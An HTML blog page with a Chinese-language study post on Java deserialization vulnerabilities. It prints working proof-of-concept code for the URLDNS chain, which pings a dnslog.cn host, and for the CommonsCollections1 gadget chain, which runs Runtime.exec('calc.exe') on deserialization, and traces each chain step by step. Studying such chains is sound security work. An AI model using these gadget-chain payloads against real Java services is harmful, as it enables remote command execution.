@@ -1,0 +1,903 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+<html class="theme-next mist use-motion" lang="">
+<head><meta name="generator" content="Hexo 3.8.0">
+  <meta charset="UTF-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+<meta name="theme-color" content="#222">
+
+
+
+  
+  
+    
+    
+  <script src="/lib/pace/pace.min.js?v=1.0.2"></script>
+  <link href="/lib/pace/pace-theme-minimal.min.css?v=1.0.2" rel="stylesheet">
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform">
+<meta http-equiv="Cache-Control" content="no-siteapp">
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css">
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css">
+
+<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css">
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=5.1.4">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">
+
+
+
+
+
+  <meta name="keywords" content="java安全,">
+
+
+
+
+
+  <link rel="alternate" href="/atom.xml" title="yemoli's blog" type="application/atom+xml">
+
+
+
+
+
+
+<meta name="description" content="对近期java反序列化漏洞学习做个记录 URLDNS测试代码 12345678910111213141516171819202122232425package ysoserial.test.mytest;import java.io.FileInputStream;import java.io.FileOutputStream;import java.io.ObjectInputStream;im">
+<meta name="keywords" content="java安全">
+<meta property="og:type" content="article">
+<meta property="og:title" content="java反序列化漏洞学习记录">
+<meta property="og:url" content="https://yml-sec.top/2020/07/06/java反序列化漏洞学习记录/index.html">
+<meta property="og:site_name" content="yemoli&#39;s blog">
+<meta property="og:description" content="对近期java反序列化漏洞学习做个记录 URLDNS测试代码 12345678910111213141516171819202122232425package ysoserial.test.mytest;import java.io.FileInputStream;import java.io.FileOutputStream;import java.io.ObjectInputStream;im">
+<meta property="og:locale" content="default">
+<meta property="og:image" content="https://yml-sec.top/2020/07/06/java反序列化漏洞学习记录/1.png">
+<meta property="og:image" content="https://yml-sec.top/2020/07/06/java反序列化漏洞学习记录/2.png">
+<meta property="og:image" content="https://yml-sec.top/2020/07/06/java反序列化漏洞学习记录/3.png">
+<meta property="og:image" content="https://yml-sec.top/2020/07/06/java反序列化漏洞学习记录/4.png">
+<meta property="og:image" content="https://yml-sec.top/2020/07/06/java反序列化漏洞学习记录/5.png">
+<meta property="og:image" content="https://yml-sec.top/2020/07/06/java反序列化漏洞学习记录/7.png">
+<meta property="og:image" content="https://yml-sec.top/2020/07/06/java反序列化漏洞学习记录/8.png">
+<meta property="og:image" content="https://yml-sec.top/2020/07/06/java反序列化漏洞学习记录/9.png">
+<meta property="og:image" content="https://yml-sec.top/2020/07/06/java反序列化漏洞学习记录/10.png">
+<meta property="og:updated_time" content="2020-07-11T03:03:10.925Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="java反序列化漏洞学习记录">
+<meta name="twitter:description" content="对近期java反序列化漏洞学习做个记录 URLDNS测试代码 12345678910111213141516171819202122232425package ysoserial.test.mytest;import java.io.FileInputStream;import java.io.FileOutputStream;import java.io.ObjectInputStream;im">
+<meta name="twitter:image" content="https://yml-sec.top/2020/07/06/java反序列化漏洞学习记录/1.png">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Mist',
+    version: '5.1.4',
+    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: 'Author'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="https://yml-sec.top/2020/07/06/java反序列化漏洞学习记录/">
+
+
+
+
+
+  <title>java反序列化漏洞学习记录 | yemoli's blog</title>
+  
+
+
+
+
+
+
+
+
+</head>
+
+<body itemscope="" itemtype="http://schema.org/WebPage" lang="default">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+    <header id="header" class="header" itemscope="" itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/" class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">yemoli's blog</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle"></p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br>
+            
+            Home
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-about">
+          <a href="/about/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-user"></i> <br>
+            
+            About
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br>
+            
+            Tags
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br>
+            
+            Archives
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-friends">
+          <a href="/friends/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-sitemap"></i> <br>
+            
+            friends
+          </a>
+        </li>
+      
+
+      
+    </ul>
+  
+
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope="" itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="https://yml-sec.top/2020/07/06/java反序列化漏洞学习记录/">
+
+    <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="夜莫离、">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope="" itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="yemoli's blog">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">java反序列化漏洞学习记录</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Posted on</span>
+              
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2020-07-06T20:26:50+08:00">
+                2020-07-06
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+            <div class="post-wordcount">
+              
+                
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-file-word-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">Words count in article&#58;</span>
+                
+                <span title="Words count in article">
+                  852
+                </span>
+              
+
+              
+                <span class="post-meta-divider">|</span>
+              
+
+              
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-clock-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">Reading time &asymp;</span>
+                
+                <span title="Reading time">
+                  4
+                </span>
+              
+            </div>
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <p>对近期java反序列化漏洞学习做个记录</p>
+<h1 id="URLDNS"><a href="#URLDNS" class="headerlink" title="URLDNS"></a>URLDNS</h1><p>测试代码</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> ysoserial.test.mytest;</span><br><span class="line"><span class="keyword">import</span> java.io.FileInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.FileOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.net.URL;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">DNS</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        HashMap&lt;URL, String&gt; hashMap = <span class="keyword">new</span> HashMap&lt;URL, String&gt;();</span><br><span class="line">        URL url = <span class="keyword">new</span> URL(<span class="string">"http://srpt8e.dnslog.cn"</span>);</span><br><span class="line">        Field f = Class.forName(<span class="string">"java.net.URL"</span>).getDeclaredField(<span class="string">"hashCode"</span>);</span><br><span class="line">        f.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        f.set(url, <span class="number">0xaaaabbbb</span>);</span><br><span class="line">        hashMap.put(url, <span class="string">"hello"</span>);</span><br><span class="line">        f.set(url, -<span class="number">1</span>);</span><br><span class="line">        ObjectOutputStream oos = <span class="keyword">new</span> ObjectOutputStream(<span class="keyword">new</span> FileOutputStream(<span class="string">"temp.bin"</span>));</span><br><span class="line">        oos.writeObject(hashMap);</span><br><span class="line">        ObjectInputStream ois = <span class="keyword">new</span> ObjectInputStream(<span class="keyword">new</span> FileInputStream(<span class="string">"temp.bin"</span>));</span><br><span class="line">        ois.readObject();</span><br><span class="line">        System.out.println(<span class="string">"called"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>调试下查看利用链</p>
+<p>首先来到<code>HashMap</code>类中的<code>readObject</code>方法，其中调用了<code>putVal</code>方法</p>
+<p><img src="/2020/07/06/java反序列化漏洞学习记录/1.png" alt="1"></p>
+<p>该方法中调用了<code>hash</code>方法</p>
+<p><img src="/2020/07/06/java反序列化漏洞学习记录/2.png" alt="2"></p>
+<p>接着调用了<code>hashCode</code>方法</p>
+<p><img src="/2020/07/06/java反序列化漏洞学习记录/3.png" alt="3"></p>
+<p>接着调用了<code>URLStreamHandler</code>类中的<code>hashCode</code>方法</p>
+<p><img src="/2020/07/06/java反序列化漏洞学习记录/4.png" alt="4"></p>
+<p>接着调用了<code>URLStreamHandler</code>类中的<code>getHostAddress</code>方法</p>
+<p><img src="/2020/07/06/java反序列化漏洞学习记录/5.png" alt="5"></p>
+<p>接着调用了<code>getByName</code>方法，该方法是用来在给定主机名的情况下确定主机的IP地址的，也就意味着执行了一次<code>DNS</code>查询，在<code>DNSLOG</code>平台上确实也留下了查询记录</p>
+<p><img src="/2020/07/06/java反序列化漏洞学习记录/7.png" alt="7"></p>
+<p>最后总结下链的触发过程</p>
+<figure class="highlight livescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="params">(HashMap)</span>-&gt;</span>readObject-&gt;putVal-&gt;hash</span><br><span class="line"><span class="function"><span class="params">(URL)</span>-&gt;</span>hashCode</span><br><span class="line"><span class="function"><span class="params">(URLStreamHandler)</span>-&gt;</span>hashCode-&gt;getHostAddress</span><br><span class="line"><span class="function"><span class="params">(InetAddress)</span>-&gt;</span>getByName</span><br></pre></td></tr></table></figure>
+<h1 id="CommonsCollections1"><a href="#CommonsCollections1" class="headerlink" title="CommonsCollections1"></a>CommonsCollections1</h1><p>使用<code>ysoserial</code>中的<code>payload</code>进行分析，<code>payload</code>中给出了利用链</p>
+<figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">Gadget chain:</span><br><span class="line">	<span class="module-access"><span class="module"><span class="identifier">ObjectInputStream</span>.</span></span>read<span class="constructor">Object()</span></span><br><span class="line">		<span class="module-access"><span class="module"><span class="identifier">AnnotationInvocationHandler</span>.</span></span>read<span class="constructor">Object()</span></span><br><span class="line">			<span class="constructor">Map(Proxy)</span>.entry<span class="constructor">Set()</span></span><br><span class="line">				<span class="module-access"><span class="module"><span class="identifier">AnnotationInvocationHandler</span>.</span></span>invoke<span class="literal">()</span></span><br><span class="line">					<span class="module-access"><span class="module"><span class="identifier">LazyMap</span>.</span></span>get<span class="literal">()</span></span><br><span class="line">						<span class="module-access"><span class="module"><span class="identifier">ChainedTransformer</span>.</span></span>transform<span class="literal">()</span></span><br><span class="line">							<span class="module-access"><span class="module"><span class="identifier">ConstantTransformer</span>.</span></span>transform<span class="literal">()</span></span><br><span class="line">							<span class="module-access"><span class="module"><span class="identifier">InvokerTransformer</span>.</span></span>transform<span class="literal">()</span></span><br><span class="line">								<span class="module-access"><span class="module"><span class="identifier">Method</span>.</span></span>invoke<span class="literal">()</span></span><br><span class="line">									<span class="module-access"><span class="module"><span class="identifier">Class</span>.</span></span>get<span class="constructor">Method()</span></span><br><span class="line">							<span class="module-access"><span class="module"><span class="identifier">InvokerTransformer</span>.</span></span>transform<span class="literal">()</span></span><br><span class="line">								<span class="module-access"><span class="module"><span class="identifier">Method</span>.</span></span>invoke<span class="literal">()</span></span><br><span class="line">									<span class="module-access"><span class="module"><span class="identifier">Runtime</span>.</span></span>get<span class="constructor">Runtime()</span></span><br><span class="line">							<span class="module-access"><span class="module"><span class="identifier">InvokerTransformer</span>.</span></span>transform<span class="literal">()</span></span><br><span class="line">								<span class="module-access"><span class="module"><span class="identifier">Method</span>.</span></span>invoke<span class="literal">()</span></span><br><span class="line">									<span class="module-access"><span class="module"><span class="identifier">Runtime</span>.</span></span>exec<span class="literal">()</span></span><br></pre></td></tr></table></figure>
+<p>接着我们来跟一下这条链，首先看一下<code>poc</code>代码</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.annotation.Retention;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationHandler;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Proxy;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">test</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> Transformer[] &#123;</span><br><span class="line">                <span class="keyword">new</span> ConstantTransformer(Runtime.class),</span><br><span class="line">                <span class="keyword">new</span> InvokerTransformer(<span class="string">"getMethod"</span>, <span class="keyword">new</span> Class[] &#123;String.class, Class[].class &#125;, <span class="keyword">new</span> Object[] &#123; <span class="string">"getRuntime"</span>, <span class="keyword">new</span> Class[<span class="number">0</span>] &#125;),</span><br><span class="line">                <span class="keyword">new</span> InvokerTransformer(<span class="string">"invoke"</span>, <span class="keyword">new</span> Class[] &#123;Object.class, Object[].class &#125;, <span class="keyword">new</span> Object[] &#123; <span class="keyword">null</span>, <span class="keyword">new</span> Object[<span class="number">0</span>] &#125;),</span><br><span class="line">                <span class="keyword">new</span> InvokerTransformer(<span class="string">"exec"</span>, <span class="keyword">new</span> Class[] &#123; String.class&#125;, <span class="keyword">new</span> String[] &#123;<span class="string">"calc.exe"</span> &#125;),</span><br><span class="line">        &#125;;</span><br><span class="line">        Transformer transformerChain = <span class="keyword">new</span> ChainedTransformer(transformers);</span><br><span class="line">        Map innerMap = <span class="keyword">new</span> HashMap();</span><br><span class="line">        Map outerMap = LazyMap.decorate(innerMap,transformerChain);</span><br><span class="line"></span><br><span class="line">        Class clazz = Class.forName(<span class="string">"sun.reflect.annotation.AnnotationInvocationHandler"</span>);</span><br><span class="line">        Constructor construct = clazz.getDeclaredConstructor(Class.class, Map.class);</span><br><span class="line">        construct.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        InvocationHandler handler = (InvocationHandler) construct.newInstance(Retention.class, outerMap);</span><br><span class="line">        Map mapProxy = (Map)Proxy.newProxyInstance(test.class.getClassLoader(),outerMap.getClass().getInterfaces(),handler);</span><br><span class="line">        Constructor&lt;?&gt; outPro = Class.forName(<span class="string">"sun.reflect.annotation.AnnotationInvocationHandler"</span>).getDeclaredConstructors()[<span class="number">0</span>];</span><br><span class="line">        outPro.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        InvocationHandler out =(InvocationHandler) outPro.newInstance(Retention.class,mapProxy);</span><br><span class="line">        FileOutputStream fo = <span class="keyword">new</span> FileOutputStream(<span class="keyword">new</span> File(<span class="string">"poc.ser"</span>));</span><br><span class="line">        ObjectOutputStream obj = <span class="keyword">new</span> ObjectOutputStream(fo);</span><br><span class="line">        obj.writeObject(out);</span><br><span class="line">        obj.close();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>当反序列化时首先会触发<code>ObjectInputStream.readObject()</code>，由于<code>AnnotationInvocationHandler</code>中重写了<code>readobject</code>方法，接着会调用<code>AnnotationInvocationHandler.readObject()</code></p>
+<p><img src="/2020/07/06/java反序列化漏洞学习记录/8.png" alt="8"></p>
+<p>该处的<code>this.memberValues</code>为<code>mapProxy</code>动态代理，在352行调用了<code>entrySet</code>方法，这会触发动态代理，从而执行<code>AnnotationInvocationHandler.invoke()</code>方法</p>
+<p><img src="/2020/07/06/java反序列化漏洞学习记录/9.png" alt="9"></p>
+<p>这个时候<code>this.memberValues</code>是一个<code>LazyMap</code>实例，在78行处自然调用了<code>LazyMap.get()</code></p>
+<p><img src="/2020/07/06/java反序列化漏洞学习记录/10.png" alt="10"></p>
+<p>其中<code>this.factory</code>再此处是一个<code>ChainedTransformer</code>实例，在59行会调用<code>ChainedTransformer.transform()</code>方法，该方法会按顺序执行我们设置的<code>transformer</code>，在该处即为我们<code>poc</code>中的该段代码</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Transformer[] transformers = <span class="keyword">new</span> Transformer[] &#123;</span><br><span class="line">                <span class="keyword">new</span> ConstantTransformer(Runtime.class),</span><br><span class="line">                <span class="keyword">new</span> InvokerTransformer(<span class="string">"getMethod"</span>, <span class="keyword">new</span> Class[] &#123;String.class, Class[].class &#125;, <span class="keyword">new</span> Object[] &#123; <span class="string">"getRuntime"</span>, <span class="keyword">new</span> Class[<span class="number">0</span>] &#125;),</span><br><span class="line">                <span class="keyword">new</span> InvokerTransformer(<span class="string">"invoke"</span>, <span class="keyword">new</span> Class[] &#123;Object.class, Object[].class &#125;, <span class="keyword">new</span> Object[] &#123; <span class="keyword">null</span>, <span class="keyword">new</span> Object[<span class="number">0</span>] &#125;),</span><br><span class="line">                <span class="keyword">new</span> InvokerTransformer(<span class="string">"exec"</span>, <span class="keyword">new</span> Class[] &#123; String.class&#125;, <span class="keyword">new</span> String[] &#123;<span class="string">"calc.exe"</span> &#125;),</span><br><span class="line">        &#125;;</span><br></pre></td></tr></table></figure>
+<p>该段代码主要是利用了<code>InvokerTransformer</code>利用反射机制可以调用任意函数的特性，实现了对<code>java.lang.Runtime</code> 类中<code>exec</code>方法的调用，进而执行任意命令</p>
+
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+      <div>
+        <div style="padding: 10px 0; margin: 20px auto; width: 90%; text-align: center;">
+  <div>坚持原创技术分享，您的支持将鼓励我继续创作！</div>
+  <button id="rewardButton" disable="enable" onclick="var qr = document.getElementById('QR'); if (qr.style.display === 'none') {qr.style.display='block';} else {qr.style.display='none'}">
+    <span>Donate</span>
+  </button>
+  <div id="QR" style="display: none;">
+
+    
+      <div id="wechat" style="display: inline-block">
+        <img id="wechat_qr" src="/images/wechatpay.jpg" alt="夜莫离、 WeChat Pay">
+        <p>WeChat Pay</p>
+      </div>
+    
+
+    
+      <div id="alipay" style="display: inline-block">
+        <img id="alipay_qr" src="/images/alipay.jpg" alt="夜莫离、 Alipay">
+        <p>Alipay</p>
+      </div>
+    
+
+    
+
+  </div>
+</div>
+
+      </div>
+    
+
+    
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/java安全/" rel="tag"># java安全</a>
+          
+        </div>
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2020/07/01/laravel反序列化漏洞分析复现/" rel="next" title="laravel反序列化漏洞分析复现">
+                <i class="fa fa-chevron-left"></i> laravel反序列化漏洞分析复现
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            Table of Contents
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            Overview
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope="" itemtype="http://schema.org/Person">
+            
+              <p class="site-author-name" itemprop="name">夜莫离、</p>
+              <p class="site-description motion-element" itemprop="description"></p>
+          </div>
+
+          <nav class="site-state motion-element">
+
+            
+              <div class="site-state-item site-state-posts">
+              
+                <a href="/archives/">
+              
+                  <span class="site-state-item-count">64</span>
+                  <span class="site-state-item-name">posts</span>
+                </a>
+              </div>
+            
+
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-tags">
+                <a href="/tags/index.html">
+                  <span class="site-state-item-count">17</span>
+                  <span class="site-state-item-name">tags</span>
+                </a>
+              </div>
+            
+
+          </nav>
+
+          
+            <div class="feed-link motion-element">
+              <a href="/atom.xml" rel="alternate">
+                <i class="fa fa-rss"></i>
+                RSS
+              </a>
+            </div>
+          
+
+          
+            <div class="links-of-author motion-element">
+                
+                  <span class="links-of-author-item">
+                    <a href="https://github.com/yemoli" target="_blank" title="GitHub">
+                      
+                        <i class="fa fa-fw fa-github"></i>GitHub</a>
+                  </span>
+                
+            </div>
+          
+
+          
+          
+
+          
+          
+            <div class="links-of-blogroll motion-element links-of-blogroll-block">
+              <div class="links-of-blogroll-title">
+                <i class="fa  fa-fw fa-link"></i>
+                Links
+              </div>
+              <ul class="links-of-blogroll-list">
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://chxing.xyz/" title="Bling_Dog" target="_blank">Bling_Dog</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://www.smi1e.top/" title="Smi1e" target="_blank">Smi1e</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://altman.vip/" title="Altman" target="_blank">Altman</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://www.virtua1.cn/" title="Virtua1" target="_blank">Virtua1</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://www.zhaoj.in/" title="赵" target="_blank">赵</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="http://www.dongzt.cn/" title="Alkaid" target="_blank">Alkaid</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://cdusec.com/" title="CDUSEC" target="_blank">CDUSEC</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="http://cdusec.happyhacking.top/" title="CDUSEC内部博客" target="_blank">CDUSEC内部博客</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="http://jjhpkcr.xyz/" title="江江河畔砍柴人" target="_blank">江江河畔砍柴人</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="http://www.youknowi.xin/" title="图先生" target="_blank">图先生</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://a3ura.github.io/" title="a3ura" target="_blank">a3ura</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="http://www.recorday.cn/" title="C0d3r1iu" target="_blank">C0d3r1iu</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://www.iloveflag.com/" title="醉梦半醒" target="_blank">醉梦半醒</a>
+                  </li>
+                
+              </ul>
+            </div>
+          
+
+          
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#URLDNS"><span class="nav-number">1.</span> <span class="nav-text">URLDNS</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#CommonsCollections1"><span class="nav-number">2.</span> <span class="nav-text">CommonsCollections1</span></a></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; 2018 &mdash; <span itemprop="copyrightYear">2020</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">夜莫离、</span>
+
+  
+</div>
+
+
